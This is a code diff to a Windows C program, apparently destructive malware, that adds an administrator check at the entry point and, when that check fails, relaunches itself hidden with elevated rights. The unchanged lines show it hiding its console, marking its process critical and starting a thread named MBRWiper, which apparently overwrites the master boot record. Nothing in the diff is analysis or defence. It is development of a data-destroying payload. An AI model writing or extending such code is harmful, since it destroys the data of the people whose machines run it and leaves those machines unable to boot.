@@ -687,6 +687,25 @@ VOID WINAPI sound8() { HWAVEOUT hWaveOut = 0; WAVEFORMATEX wfx = { WAVE_FORMAT_P
 
 // ==================== ТОЧКА ВХОДА ====================
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    BOOL bIsAdmin = FALSE;
+    PSID pAdmin = NULL;
+    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
+        CheckTokenMembership(NULL, pAdmin, &bIsAdmin);
+        FreeSid(pAdmin);
+    }
+    
+    if (!bIsAdmin) {
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        SHELLEXECUTEINFOA sei = {sizeof(sei)};
+        sei.lpVerb = "runas";
+        sei.lpFile = path;
+        sei.nShow = SW_HIDE;
+        ShellExecuteExA(&sei);
+        ExitProcess(0);
+    }
+    
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     ProcessIsCritical();
     CreateThread(0, 0, MBRWiper, 0, 0, 0);
